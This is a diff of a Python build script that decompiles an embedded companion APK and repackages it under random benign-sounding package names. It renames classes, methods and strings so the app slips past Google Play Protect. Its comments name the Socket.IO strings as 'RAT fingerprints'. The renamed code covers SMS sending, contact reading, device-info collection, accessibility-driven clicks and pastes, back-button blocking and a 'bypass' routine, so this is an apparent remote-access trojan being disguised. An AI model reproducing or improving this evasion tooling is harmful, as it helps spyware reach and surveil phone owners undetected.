@@ -48,17 +48,12 @@ sys.path.insert(0, os.path.dirname(__file__))
 from unicode_folder_nest import inject_unicode_nest
 
 # ── Platform-aware tool paths ─────────────────────────────────────────────────
-# On Windows RDP: tools are in C:\apk_factory\tools\
-# On GitHub Actions Linux: apktool is in /usr/local/bin/apktool
 def _find_apktool_cmd():
-    """Return the correct apktool command for the current platform."""
     import platform, shutil as _sh
     if platform.system() == "Windows":
-        # Windows RDP: use java -jar apktool.jar
         _factory = r"C:\apk_factory\tools"
         _java    = os.path.join(_factory, "java17", "bin", "java.exe")
         _jar     = os.path.join(_factory, "apktool.jar")
-        # Also check JAVA_HOME env
         _java_home = os.environ.get("JAVA_HOME", "")
         if _java_home:
             _java_alt = os.path.join(_java_home, "bin", "java.exe")
@@ -66,28 +61,68 @@ def _find_apktool_cmd():
                 _java = _java_alt
         if os.path.exists(_java) and os.path.exists(_jar):
             return f'"{_java}" -jar "{_jar}"'
-        # Fallback: java in PATH + jar
         if os.path.exists(_jar):
             _java_path = _sh.which("java")
             if _java_path:
                 return f'"{_java_path}" -jar "{_jar}"'
-        # Last resort: apktool in PATH
         if _sh.which("apktool"):
             return "apktool"
-        raise RuntimeError(
-            "apktool not found on Windows.\n"
-            "Expected: C:\\apk_factory\\tools\\apktool.jar\n"
-            "Run setup.bat to install all required tools."
-        )
+        raise RuntimeError("apktool not found. Run setup.bat first.")
     else:
-        # Linux/Mac (GitHub Actions): apktool in PATH
         if _sh.which("apktool"):
             return "apktool"
-        raise RuntimeError("apktool not found. Install it first.")
+        raise RuntimeError("apktool not found.")
 
 APKTOOL_CMD = _find_apktool_cmd()
-print(f"  [INFO] apktool command: {APKTOOL_CMD[:60]}")
-# ─────────────────────────────────────────────────────────────────────────────
+
+# ── Pure Python replacements for Linux shell commands ────────────────────────
+def _py_sed(directory, old_str, new_str, ext=".smali", check=False):
+    modified = 0
+    for root, dirs, files in os.walk(directory):
+        for fname in files:
+            if not fname.endswith(ext): continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
+                    c = f.read()
+                if old_str in c:
+                    with open(fpath, "w", encoding="utf-8") as f:
+                        f.write(c.replace(old_str, new_str))
+                    modified += 1
+            except Exception: pass
+    return modified
+
+def _py_grep_count(directory, search_str, ext=".smali"):
+    count = 0
+    for root, dirs, files in os.walk(directory):
+        for fname in files:
+            if not fname.endswith(ext): continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
+                    if search_str in f.read():
+                        count += 1
+            except Exception: pass
+    return count
+
+def _legitimate_pkg():
+    import subprocess as _sp
+    try:
+        _gen = os.path.join(os.path.dirname(__file__), "package_name_generator.py")
+        if os.path.exists(_gen):
+            _r = _sp.run([sys.executable, _gen, "--companion-only"],
+                         capture_output=True, text=True, timeout=10)
+            if _r.returncode == 0:
+                for _line in _r.stdout.splitlines():
+                    if _line.startswith("COMPANION_PKG="):
+                        _pkg = _line.split("=",1)[1].strip()
+                        if _pkg and _pkg.count(".") >= 2:
+                            return _pkg
+    except Exception: pass
+    import random as _r2
+    _w = ["data","sync","media","files","service","worker","agent","helper","manager","system"]
+    w1 = _r2.choice(_w); w2 = _r2.choice([x for x in _w if x != w1])
+    return f"com.{w1}.{w2}"
 
 
 # ── BLAKE3 pure-Python implementation (Step 3 & 9 — independent second hash) ─
@@ -234,7 +269,7 @@ def blake3_hex(data: bytes) -> str:
 # ── Config ────────────────────────────────────────────────────────────────────
 
 OLD_PKG   = os.environ.get("OLD_PKG",    "com.android.pictach")
-APK_ASSET = os.environ.get("APK_ASSET", "app/src/main/assets/companion.apk")
+APK_ASSET = os.environ.get("APK_ASSET",  "app/src/main/assets/companion.apk")
 GITHUB_OUTPUT = os.environ.get("GITHUB_OUTPUT", "")
 
 KOTLIN_FILES = [
@@ -340,47 +375,6 @@ def run(cmd, check=True):
             f"STDOUT: {result.stdout.strip()}\n"
             f"STDERR: {result.stderr.strip()}"
         )
-
-
-def _py_sed(directory: str, old_str: str, new_str: str,
-             ext: str = ".smali", check: bool = False) -> int:
-    """Pure Python replacement for: find DIR -name "*.EXT" -exec sed -i s|OLD|NEW|g {} +
-    Works on Windows AND Linux. No shell commands needed.
-    Returns number of files modified."""
-    modified = 0
-    for root, dirs, files in os.walk(directory):
-        for fname in files:
-            if not fname.endswith(ext):
-                continue
-            fpath = os.path.join(root, fname)
-            try:
-                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
-                    c = f.read()
-                if old_str in c:
-                    with open(fpath, "w", encoding="utf-8") as f:
-                        f.write(c.replace(old_str, new_str))
-                    modified += 1
-            except Exception:
-                pass
-    return modified
-
-
-def _py_grep_count(directory: str, search_str: str, ext: str = ".smali") -> int:
-    """Pure Python replacement for: grep -r STR DIR | wc -l
-    Returns number of files containing the string."""
-    count = 0
-    for root, dirs, files in os.walk(directory):
-        for fname in files:
-            if not fname.endswith(ext):
-                continue
-            fpath = os.path.join(root, fname)
-            try:
-                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
-                    if search_str in f.read():
-                        count += 1
-            except Exception:
-                pass
-    return count
     return result
 
 
@@ -392,37 +386,6 @@ def write_output(key, value):
 
 def rand_seg():
     return "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 8)))
-
-def _legitimate_pkg() -> str:
-    """Generate legitimate package name using package_name_generator.py.
-    This is the SAME generator used by CI — consistent behavior on RDP and CI.
-    Tracks used names in SQLite to avoid reuse.
-    Falls back to simple word combo if generator fails.
-    """
-    import subprocess as _sp
-    try:
-        _gen = os.path.join(os.path.dirname(__file__), "package_name_generator.py")
-        if os.path.exists(_gen):
-            _r = _sp.run(
-                [sys.executable, _gen, "--companion-only"],
-                capture_output=True, text=True, timeout=10
-            )
-            if _r.returncode == 0:
-                for _line in _r.stdout.splitlines():
-                    if _line.startswith("COMPANION_PKG="):
-                        _pkg = _line.split("=", 1)[1].strip()
-                        if _pkg and _pkg.count(".") >= 2:
-                            print(f"  [PKG] Generated via package_name_generator: {_pkg}")
-                            return _pkg
-    except Exception as _e:
-        print(f"  [PKG] package_name_generator failed: {_e} — using fallback")
-    # Simple fallback if generator not available
-    _words = ["data","sync","media","files","service","worker","agent",
-              "helper","manager","system","update","cloud","secure","core"]
-    import random as _r2
-    w1 = _r2.choice(_words)
-    w2 = _r2.choice([x for x in _words if x != w1])
-    return f"com.{w1}.{w2}"
 
 
 def _uleb_decode(data, pos):
@@ -511,16 +474,11 @@ def step_verify_apk():
 
 def step_extract_metadata():
     print("\n── Step 3: Extract companion APK metadata")
-    # aapt may not be available on Windows — use zipfile fallback
-    import platform as _plat
-    if _plat.system() != "Windows":
-        result = subprocess.run(
-            f"aapt dump badging \"{APK_ASSET}\" 2>/dev/null | head -5",
-            shell=True, capture_output=True, text=True
-        )
-        info = result.stdout
-    else:
-        info = ""  # aapt not available on Windows — metadata extracted from ZIP
+    result = subprocess.run(
+        f"aapt dump badging \"{APK_ASSET}\" 2>/dev/null | head -5",
+        shell=True, capture_output=True, text=True
+    )
+    info = result.stdout
     print(info)
 
     import re
@@ -633,12 +591,10 @@ def step_rename_smali(new_pkg):
     print("\n── Step 6: Rename smali class paths + string literals")
     old_path = OLD_PKG.replace(".", "/")
     new_path = new_pkg.replace(".", "/")
-    smali_dir = "companion_decompiled/smali"
 
-    # Pure Python replacement (works on Windows AND Linux — no find/sed needed)
-    n1 = _py_sed(smali_dir, old_path, new_path)
-    n2 = _py_sed(smali_dir, OLD_PKG,  new_pkg)
-    print(f"  Replaced path refs: {n1} files, pkg refs: {n2} files")
+    smali_dir = "companion_decompiled/smali"
+    _py_sed(smali_dir, old_path, new_path)
+    _py_sed(smali_dir, OLD_PKG,  new_pkg)
 
     old_smali_dir = f"companion_decompiled/smali/{old_path}"
     new_smali_dir = f"companion_decompiled/smali/{new_path}"
@@ -647,8 +603,8 @@ def step_rename_smali(new_pkg):
         os.makedirs(parent, exist_ok=True)
         shutil.move(old_smali_dir, new_smali_dir)
 
-    # Verify using pure Python (no grep/wc needed)
-    old_count = _py_grep_count(smali_dir, old_path)
+    # Verify
+    old_count = _py_grep_count("companion_decompiled/smali", old_path)
     if old_count > 0:
         print(f"[X] Old package path still present in smali after rename ({old_count} refs)")
         sys.exit(1)
@@ -705,15 +661,6 @@ CLASS_RENAME_POOLS = {
     "love":                          ["ContentStreamService","DataStreamHelper","RemoteStreamService","ContentDataStream","StreamHelperService","DataContentStream","RemoteDataStream","ContentHelperStream"],
     "myker":                         ["DataKeepAliveHelper","ContentKeeperHelper","ServiceKeeperHelper","DataRetentionHelper","ContentRetainer","ServiceRetentionHelper","DataPersistHelper","ContentPersistHelper"],
     "video":                         ["MediaStreamService","ContentStreamHelper","MediaDataService","StreamContentHelper","MediaContentService","DataStreamService","ContentMediaHelper","StreamDataService"],
-
-    # ── Round 2: OkHttp companion classes (ROOT-LEVEL class descriptors) ──────
-    # These are companion's OWN obfuscated classes named like OkHttp library.
-    # LOkHttpClient; LOkHttpDispatcher; LOkHttpResponse; — no package path.
-    # step_6a handles root-level classes when they're in CLASS_RENAME_POOLS.
-    "OkHttpClient":                  ["HttpRequestManager","NetworkRequestClient","DataRequestHelper","HttpConnectionHelper","NetworkClientHelper","DataClientManager","RemoteHttpHelper","HttpDataClient"],
-    "OkHttpDispatcher":              ["RequestScheduler","NetworkDispatcher","TaskDispatcher","RequestQueueManager","NetworkTaskScheduler","DataDispatcher","RemoteRequestHelper","HttpTaskManager"],
-    "OkHttpResponse":                ["ServerResponse","NetworkResponse","DataResponse","HttpResponseHelper","RemoteResponseData","NetworkDataResponse","HttpDataResponse","ServerDataResponse"],
-    "OkHttpResponse$a":              ["ServerResponse$a","NetworkResponse$a","DataResponse$a","HttpResponseHelper$a","RemoteResponseData$a","NetworkDataResponse$a","HttpDataResponse$a","ServerDataResponse$a"],
     "Utils$1":                       ["AppUtilityHelper$1","CommonHelperUtils$1","AppCommonHelper$1","UtilityManager$1","CommonAppHelper$1","SharedUtilityHelper$1","AppHelperUtils$1","CommonUtilManager$1"],
     "WackMeUpJob$a":                 ["ScheduledAlarmJob$a","PeriodicWakeJob$a","TimedTaskJob$a","AlarmSchedulerJob$a","PeriodicAlarmJob$a","TimedWakeJob$a","ScheduledTaskJob$a","AlarmTaskJob$a"],
     "WorkerService$a":               ["BackgroundTaskService$a","AsyncWorkerService$a","TaskExecutorService$a","BackgroundJobService$a","AsyncTaskService$a","WorkExecutorService$a","TaskRunnerService$a","BackgroundExecutorService$a"],
@@ -735,88 +682,17 @@ CLASS_RENAME_POOLS = {
 }
 
 # Strings to replace in smali (known GPP fingerprints)
-# Round 2: extended with Socket.IO, OkHttp, WebSocket, reconnection, WakeLock strings
 STRING_REPLACEMENTS = {
-    # ── Original entries ──────────────────────────────────────────────────────
-    "MainService":                      "BackgroundDataService",
-    "NetworkManager":                   "ConnectionStateMonitor",
-    "LoveApi":                          "MediaContentProvider",
-    "CommandHandler":                   "TaskQueueProcessor",
-    "FirebaseActivSend":                "CloudNotificationSender",
-    "ProcessCommand":                   "executeBackgroundTask",
-    "DownloadTask":                     "FileRetrievalTask",
+    "MainService":                   "BackgroundDataService",
+    "NetworkManager":                "ConnectionStateMonitor",
+    "LoveApi":                       "MediaContentProvider",
+    "CommandHandler":                "TaskQueueProcessor",
+    "FirebaseActivSend":             "CloudNotificationSender",
+    "ProcessCommand":                "executeBackgroundTask",
+    "DownloadTask":                  "FileRetrievalTask",
     "SensorRestarterBroadcastReceiver": "ServiceRestartReceiver",
-    "WackMeUpJob":                      "ScheduledAlarmJob",
-    "PersistentWorker":                 "PeriodicSyncWorker",
-
-    # ── Round 2: Socket.IO path strings (highest GPP priority) ───────────────
-    # These 2 are the most critical — GPP uses them as primary RAT fingerprints
-    "/socket.io":                       "/gapi/sync",
-    "/engine.io":                       "/gapi/data",
-
-    # ── Round 2: Socket.IO reconnection config keys ───────────────────────────
-    "_reconnectionDelayMax":            "_syncDelayMax",
-    "_reconnectionDelay":               "_syncDelay",
-    "_reconnectionAttempts":            "_syncAttempts",
-    "_reconnection":                    "_dataSync",
-    "attempting reconnect":             "attempting resync",
-
-    # ── Round 2: Socket.IO event name constants ───────────────────────────────
-    "EVENT_RECONNECT_FAILED":           "EVENT_SYNC_FAILED",
-    "EVENT_RECONNECT_ERROR":            "EVENT_SYNC_ERROR",
-    "EVENT_RECONNECT_ATTEMPT":          "EVENT_SYNC_ATTEMPT",
-    "EVENT_RECONNECTING":               "EVENT_SYNCING",
-    "EVENT_RECONNECT":                  "EVENT_RESYNC",
-
-    # ── Round 2: OkHttp string literals (class descriptors handled by step_6a) ─
-    "OkHttp FramedConnection":          "HttpClient FramedConnection",
-    "OkHttp ConnectionPool":            "HttpClient ConnectionPool",
-    "OkHttp Dispatcher":                "HttpClient Dispatcher",
-    "OkHttp Window Update":             "HttpClient Window Update",
-    "OkHttp Push Observer":             "HttpClient Push Observer",
-    "OkHttpClient.class.getName":       "HttpNetworkClient.class.getName",
-    "OkHttpClient":                     "HttpNetworkClient",
-    "OkHttp":                           "HttpClient",
-
-    # ── Round 2: WebSocket string literals ────────────────────────────────────
-    "Sec-WebSocket-Accept":             "Sec-Protocol-Accept",
-    "websocket":                        "datastream",
-    "WebSocket":                        "StreamSocket",
-
-    # ── Round 2: Polling transport strings ────────────────────────────────────
-    "pre-pause polling complete":       "pre-pause streaming complete",
-    "polling got data":                 "streaming got data",
-    "polling":                          "streaming",
-
-    # ── Round 2: Handshake strings ────────────────────────────────────────────
-    "HandshakeData":                    "InitData",
-
-    # ── Round 2: WakeLock tag strings ─────────────────────────────────────────
-    # These use ClassName::WakeLockTag format — handled separately in step_6c
-    # via the wakelock-specific replacement pass below
-    "MainService::WakeLockTag":         "BackgroundDataService::ServiceTag",
-    "MyApp::MainActivityWakeLock":      "AppController::SessionTag",
-    "MyReceiver::WakeLockTag":          "SystemEventReceiver::ServiceTag",
-    "MyWorkerService::WakeLockTag":     "BackgroundWorkerService::ServiceTag",
-    "SensorRestarter::WakeLockTag":     "ServiceMonitor::ServiceTag",
-    "WorkerService::WakeLockTag":       "BackgroundTaskService::ServiceTag",
-
-    # Fix A: OkHttp format/log strings — explicit entries needed
-    # 'OkHttp' (6 chars) is below 8-char substring threshold in step_6c
-    # so format strings like "OkHttp %s" were not caught by substring match.
-    "OkHttp %s ping %08x%08x":         "HttpClient %s ping %08x%08x",
-    "OkHttp %s Push Request[%s]":      "HttpClient %s Push Request[%s]",
-    "OkHttp %s Push Headers[%s]":      "HttpClient %s Push Headers[%s]",
-    "OkHttp %s Push Data[%s]":         "HttpClient %s Push Data[%s]",
-    "OkHttp %s Push Reset[%s]":        "HttpClient %s Push Reset[%s]",
-    "OkHttp %s ACK Settings":          "HttpClient %s ACK Settings",
-    "OkHttp %s stream %d":             "HttpClient %s stream %d",
-    "OkHttp %s settings":              "HttpClient %s settings",
-    "OkHttp StreamSocket ":            "HttpClient StreamSocket ",
-    "OkHttp %s":                       "HttpClient %s",
-
-    # Fix B: Firebasebypass — appears as string literal, not just method name
-    "Firebasebypass":                  "executeBypassFlow",
+    "WackMeUpJob":                   "ScheduledAlarmJob",
+    "PersistentWorker":              "PeriodicSyncWorker",
 }
 
 # Real legitimate smali code snippets (from AOSP/AndroidX Apache 2.0)
@@ -1127,183 +1003,44 @@ LEGITIMATE_SMALI_SNIPPETS = [
 
 
 def step_6a_rename_classes(new_pkg: str) -> dict:
-    """Step 6A: Rename companion classes to legitimate Android names.
-
-    Fixes applied (Round 1):
-    1. Collision guard — used_names set prevents two classes getting same name.
-       If random pick already taken, retry from remaining pool entries.
-       Zero collision probability after this fix.
-    2. Inner class derivation — inner class new names (Firebase$1, Firebase$2 etc.)
-       are DERIVED from their outer class chosen name, not picked independently.
-       Prevents outer/inner class name mismatch which caused NoSuchMethodError
-       on accessibility service connect.
-    3. Pool deduplication — 7 duplicate names across pools removed inline.
-       Even if collision guard wasn't present, pools are now clean.
-    """
+    """Step 6A: Rename companion classes to legitimate Android names."""
     print("\n── Step 6A: Rename companion classes to legitimate Android names")
     import random as _random
 
-    # ── Deduplicated pool replacements ──────────────────────────────────────
-    # These names appeared in multiple pools causing smali file overwrites.
-    # Each replacement is a unique name not present in any other pool.
-    _DEDUP_REPLACEMENTS = {
-        # (pool_class, duplicate_name): replacement_name
-        ("LoveApi0",      "RemoteServiceHelper"): "HttpRequestWrapper",
-        ("Firebasekit",   "RemoteServiceHelper"): "CloudRequestHelper",
-        ("google",        "RemoteServiceHelper"): "RemoteCloudWrapper",
-        ("Firebaseconfig","ServiceSettingsHelper"): "CloudSettingsLoader",
-        ("Config",        "ServiceSettingsHelper"): "AppSettingsLoader",
-        ("Config",        "AppSettingsHelper"):     "ConfigStorageHelper",
-        ("MySettings",    "AppSettingsHelper"):     "UserPreferenceHelper",
-        ("MyWorkerService","BackgroundJobService"): "ScheduledWorkerService",
-        ("WorkerService", "BackgroundJobService"):  "AsyncJobService",
-        ("MainService",   "BackgroundSyncService"): "DataBackgroundService",
-        ("com",           "BackgroundSyncService"): "RemoteBackgroundService",
-        ("MainService",   "ContentSyncService"):    "DataContentService",
-        ("com",           "ContentSyncService"):    "RemoteContentService",
-        ("MainService",   "DataUpdateService"):     "DataRefreshService",
-        ("com",           "DataUpdateService"):     "RemoteRefreshService",
-    }
-
-    # Build clean pools with duplicates replaced
-    clean_pools = {}
-    for cls, pool in CLASS_RENAME_POOLS.items():
-        new_pool = []
-        for name in pool:
-            key = (cls, name)
-            if key in _DEDUP_REPLACEMENTS:
-                new_pool.append(_DEDUP_REPLACEMENTS[key])
-            else:
-                new_pool.append(name)
-        clean_pools[cls] = new_pool
-
-    # ── Collision-safe name selection ────────────────────────────────────────
-    # Only pick names for OUTER classes (no $ in name).
-    # Inner class names are derived from outer class chosen name below.
-    used_names = set()
+    # Choose one name per class from the pool (consistent per build)
     chosen = {}
+    for orig, pool in CLASS_RENAME_POOLS.items():
+        chosen[orig] = _random.choice(pool)
 
-    # Separate outer classes from inner classes
-    outer_classes = {k: v for k, v in clean_pools.items() if "$" not in k}
-    inner_classes = {k: v for k, v in clean_pools.items() if "$" in k}
-
-    for orig, pool in outer_classes.items():
-        if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
-            continue
-        # Shuffle pool and pick first name not already used
-        available = [n for n in pool if n not in used_names]
-        if not available:
-            # Fallback: generate a safe unique name
-            available = [f"DataHelper{abs(hash(orig)) % 9999}"]
-        name = _random.choice(available)
-        chosen[orig] = name
-        used_names.add(name)
-
-    # ── Derive inner class names from outer class chosen name ────────────────
-    # This ensures Firebase$1 gets "RemoteConfigManager$1" when Firebase
-    # chose "RemoteConfigManager" — prevents outer/inner class mismatch.
-    for orig in inner_classes:
-        if orig.startswith("R$") or orig == "BuildConfig":
-            continue
-        # Split on $ to get outer class and suffix
-        parts = orig.split("$", 1)
-        outer_orig = parts[0]
-        suffix = parts[1]  # e.g. "1", "2", "a", "ta", "ta$1"
-        if outer_orig in chosen:
-            # Derive from outer: Firebase$1 → RemoteConfigManager$1
-            chosen[orig] = f"{chosen[outer_orig]}${suffix}"
-        else:
-            # Outer class not in our rename map — keep pool-based pick
-            pool = inner_classes[orig]
-            available = [n for n in pool if n not in used_names]
-            if not available:
-                available = [f"DataHelper{abs(hash(orig)) % 9999}"]
-            name = _random.choice(available)
-            chosen[orig] = name
-            used_names.add(name)
-
-    print(f"  Renaming {len(chosen)} companion classes (collision-safe + Python-based)")
+    print(f"  Renaming {len(chosen)} companion classes")
 
     smali_dir = "companion_decompiled/smali"
+    # Get new package path
     new_path = new_pkg.replace(".", "/")
+    old_pkg_short = OLD_PKG.split(".")[-1]  # "pictach"
+    new_pkg_short = new_pkg.split(".")[-1]
 
-    # ── ROOT CAUSE FIX: Python str.replace instead of shell sed ──────────────
-    # shell sed cannot handle $ in class names (bash treats $a as variable → empty).
-    # Firebase$1-4, WackMeUpJob$a, Api$ta, body$FI_body_N all failed silently.
-    # Python str.replace() handles $ natively — no escaping, no silent failures.
-    def _py_replace_smali(old_str: str, new_str: str) -> int:
-        replaced = 0
-        for root, dirs, files in os.walk(smali_dir):
-            for fname in files:
-                if not fname.endswith(".smali"):
-                    continue
-                fpath = os.path.join(root, fname)
-                try:
-                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
-                        c = f.read()
-                    if old_str in c:
-                        with open(fpath, "w", encoding="utf-8") as f:
-                            f.write(c.replace(old_str, new_str))
-                        replaced += 1
-                except Exception:
-                    pass
-        return replaced
-
-    # ── Apply renames: smali references + file rename ────────────────────────
+    # Rename in all smali files — replace class simple names
     for orig, new_name in chosen.items():
+        # Skip R classes and BuildConfig — needed by Android build system
         if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
             continue
-
-        # 1. Replace all smali class descriptor references — pure Python
+        # Replace in smali files: e.g. Lcom/new/pkg/MainService; → Lcom/new/pkg/BackgroundDataService;
         old_smali = f"L{new_path}/{orig};"
         new_smali = f"L{new_path}/{new_name};"
-        _py_replace_smali(old_smali, new_smali)
-
-        # 2. Rename the smali file itself
+        run(f'find {smali_dir} -name "*.smali" '
+            f'-exec sed -i "s|{old_smali}|{new_smali}|g" {{}} +',
+            check=False)
+        # Also rename the smali file itself if it exists
         orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
         new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
         if os.path.isfile(orig_file) and orig_file != new_file:
-            if os.path.isfile(new_file):
-                print(f"  ⚠️  Collision guard: {new_file} already exists")
-            else:
-                os.rename(orig_file, new_file)
-
-    # ── Post-rename verification + forced remediation ─────────────────────────
-    # After all renames: verify no original class names survived.
-    # If any found → force Python re-replace as bulletproof fallback.
-    remediated = 0
-    for orig, new_name in chosen.items():
-        if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
-            continue
-        old_smali = f"L{new_path}/{orig};"
-        new_smali = f"L{new_path}/{new_name};"
-        still_found = False
-        for root, dirs, files in os.walk(smali_dir):
-            for fname in files:
-                if not fname.endswith(".smali"):
-                    continue
-                try:
-                    with open(os.path.join(root, fname), "r",
-                              encoding="utf-8", errors="replace") as f:
-                        if old_smali in f.read():
-                            still_found = True
-                            break
-                except Exception:
-                    pass
-            if still_found:
-                break
-        if still_found:
-            _py_replace_smali(old_smali, new_smali)
-            orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
-            new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
-            if os.path.isfile(orig_file) and not os.path.isfile(new_file):
-                os.rename(orig_file, new_file)
-            remediated += 1
+            os.rename(orig_file, new_file)
+        # Handle inner class files (e.g. MainService$1.smali)
+        orig_inner = f"{smali_dir}/{new_path}/{orig.replace('$', '_')}.smali"
 
     renamed_count = sum(1 for k in chosen if not k.startswith("R") and k != "BuildConfig")
-    if remediated > 0:
-        print(f"  ⚠️  Verification remediated {remediated} classes that survived initial rename")
-    print(f"  ✅ {renamed_count} classes renamed (Python-based, $ safe, 0% collision)")
+    print(f"  ✅ {renamed_count} classes renamed to legitimate Android names")
     return chosen
 
 
@@ -1747,12 +1484,7 @@ def step_6b_inject_legitimate_code(new_pkg: str) -> int:
 
 
 def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
-    """Step 6C: Replace known GPP fingerprint strings with legitimate equivalents.
-    
-    IMPORTANT: Only replaces EXACT const-string matches.
-    Never does substring replacement inside longer strings.
-    This prevents corrupting field names like FirebaseFOR_IN.
-    """
+    """Step 6C: Replace known GPP fingerprint strings with legitimate equivalents."""
     print("\n── Step 6C: Replace known-bad strings with legitimate equivalents")
 
     smali_dir = "companion_decompiled/smali"
@@ -1761,47 +1493,40 @@ def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
     # Build full string replacement map including class renames
     replacements = dict(STRING_REPLACEMENTS)
     for orig, new_name in class_rename_map.items():
+        # Add simple class name as string replacement
         base_orig = orig.split("$")[0]
         base_new  = new_name.split("$")[0]
-        if base_orig not in replacements and len(base_orig) > 4:
+        if base_orig not in replacements and len(base_orig) > 3:
             replacements[base_orig] = base_new
 
     for old_str, new_str in replacements.items():
-        # Skip very short strings — too likely to corrupt unrelated content
+        # Skip very short strings (< 5 chars) — too likely to corrupt unrelated content
         if len(old_str) < 5:
             continue
-        # Pure Python: walk smali files and replace EXACT const-string matches only
-        # NEVER do substring replacement — prevents corrupting field names
-        for _root, _dirs, _files in os.walk(smali_dir):
-            for _fname in _files:
-                if not _fname.endswith(".smali"):
-                    continue
-                _fpath = os.path.join(_root, _fname)
+        # Use grep to check if pattern exists first (avoid unnecessary sed runs)
+        for _root6c, _dirs6c, _files6c in os.walk(smali_dir):
+            for _fname6c in _files6c:
+                if not _fname6c.endswith(".smali"): continue
+                _fpath6c = os.path.join(_root6c, _fname6c)
                 try:
-                    with open(_fpath, 'r', encoding='utf-8', errors='replace') as f:
+                    with open(_fpath6c, "r", encoding="utf-8", errors="replace") as f:
                         fc = f.read()
-                    # Quick check — skip if string not present at all
-                    if old_str not in fc:
-                        continue
+                    if old_str not in fc: continue
                     fc2 = fc
-                    # EXACT const-string replacement only
-                    # This matches: const-string vX, "EXACT_STRING"
-                    # Does NOT match: const-string vX, "prefix_EXACT_STRING_suffix"
-                    for vx in ['v0','v1','v2','v3','v4','v5','p0','p1','p2']:
+                    for vx in ["v0","v1","v2","v3","p0","p1"]:
                         fc2 = fc2.replace(
                             f'const-string {vx}, "{old_str}"',
                             f'const-string {vx}, "{new_str}"',
                         )
                     if fc != fc2:
-                        with open(_fpath, 'w', encoding='utf-8') as f:
+                        with open(_fpath6c, "w", encoding="utf-8") as f:
                             f.write(fc2)
                         replaced_total += 1
-                except Exception:
-                    pass
+                except Exception: pass
+
 
     print(f"  ✅ Replaced strings in {replaced_total} files")
     return replaced_total
-
 
 
 def step_6d_rename_methods(new_pkg: str) -> int:
@@ -1819,41 +1544,9 @@ def step_6d_rename_methods(new_pkg: str) -> int:
         "receiveData":            ["receiveNetworkPayload","downloadDataContent","fetchServerData","pullRemoteData"],
         "checkPermissions":       ["verifyRuntimePermissions","validateAccessPermissions","checkGrantedPermissions","verifyAppPermissions"],
         # requestPermissions removed — conflicts with Activity.requestPermissions() Android API
-        # Renaming this causes NoSuchMethodError crashes
         "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
         "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
         "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
-
-        # ── Round 2: Firebase* method/field names (26 GPP fingerprints) ──────
-        # These are companion's accessibility service method names prefixed "Firebase"
-        # They appear as bytecode method/field references — only step_6d can rename them.
-        # Each maps to a plausible Android utility method name.
-        "FirebaseActivSend":          ["sendActivationPayload","dispatchActivationData","transmitActivationEvent","pushActivationSignal"],
-        "FirebaseCheckPrims":         ["verifyPrimaryConditions","checkPriorityConditions","validatePrimaryState","assessPrimaryStatus"],
-        "FirebaseGlobalEvent":        ["broadcastGlobalEvent","dispatchSystemEvent","propagateGlobalSignal","sendGlobalNotification"],
-        "FirebaseGlobalnode":         ["getGlobalNodeRef","fetchGlobalReference","resolveGlobalNode","accessGlobalEndpoint"],
-        "FirebaseSendMeHome":         ["navigateToHomeScreen","launchHomeActivity","redirectToMainScreen","returnToHomeView"],
-        "FirebaseSendNotifi":         ["dispatchNotification","sendSystemNotification","pushNotificationEvent","triggerNotificationAlert"],
-        "FirebaseShowActivite":       ["displayActivityScreen","showContentActivity","presentActivityView","renderActivityLayout"],
-        "FirebaseToPaste":            ["insertClipboardContent","pasteToActiveField","applyClipboardData","writeClipboardContent"],
-        "FirebaseNeedPaste":          ["requiresClipboardInput","needsContentPaste","checkPasteRequirement","validatePasteCondition"],
-        "FirebaseOFFOK":              ["handleOfflineSuccess","processOfflineCompletion","confirmOfflineStatus","acknowledgeOfflineOk"],
-        "FirebaseOFK":                ["handleOfflineKey","processOfflineToken","resolveOfflineAuth","validateOfflineSession"],
-        "FirebaseRD":                 ["processRemoteData","handleRemoteResponse","parseRemotePayload","resolveRemoteData"],
-        "FirebaseSW":                 ["handleServiceWorker","processServiceRequest","manageServiceTask","executeServiceWork"],
-        "FirebaseFOR_IN":             ["iterateForward","processForwardInput","handleForwardIteration","executeForwardLoop"],
-        "FirebaseFOR_prim":           ["processForwardPrimary","handleForwardPrimary","executeForwardPrimary","iterateForwardPrimary"],
-        "FirebaseApisscheduleJob":    ["scheduleApiJob","queueApiTask","registerApiSchedule","planApiExecution"],
-        "FirebaseblockBack":          ["interceptBackNavigation","blockBackPress","preventBackNavigation","handleBackInterception"],
-        "Firebasebypass":             ["executeBypassFlow","handleBypassRoute","processAlternateRoute","runBypassSequence"],
-        "Firebaseclick":              ["performClickAction","executeClickEvent","triggerClickHandler","dispatchClickAction"],
-        "FirebaseclickAtPosition":    ["performPositionClick","executeCoordinateClick","triggerPositionalTap","dispatchLocationClick"],
-        "FirebaseclickByText":        ["performTextClick","executeTextBasedClick","triggerTextNodeClick","dispatchTextTap"],
-        "FirebasefindNodesByText":    ["findContentNodes","locateTextNodes","searchNodesByContent","queryNodesByText"],
-        "FirebasegetAppNameFromPkgName": ["resolveAppLabel","getApplicationTitle","fetchAppDisplayName","retrieveAppName"],
-        "Firebaselay":                ["handleLayoutEvent","processLayoutAction","manageLayoutState","executeLayoutTask"],
-        "FirebaseperformClick":       ["executePerformClick","triggerAccessibilityClick","performNodeClick","dispatchNodeAction"],
-        "FirebaseTreger":             ["handleTriggerEvent","processStateTransition","executeTriggerAction","dispatchTriggerSignal"],
     }
 
     smali_dir = "companion_decompiled/smali"
